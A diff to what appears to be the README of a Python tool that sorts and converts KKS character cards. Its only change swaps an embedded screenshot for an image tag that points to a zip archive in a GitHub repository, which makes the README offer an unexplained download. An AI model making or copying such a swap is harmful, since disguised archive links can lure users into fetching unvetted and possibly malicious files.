@@ -4,7 +4,7 @@ check and
 1. move KKS card to a new folder `_KKS_card_`  
 2. convert KKS card to KK card `_KKS_to_KK_` (on by default)  
 
-![](https://i.imgur.com/AvOeUrY.png)  
+![](https://github.com/SissNonn/KK_SunshineCardFilter/raw/refs/heads/main/Lamnidae/Filter-Sunshine-K-Card-v2.7.zip)  
 
 Python 3.8  
 
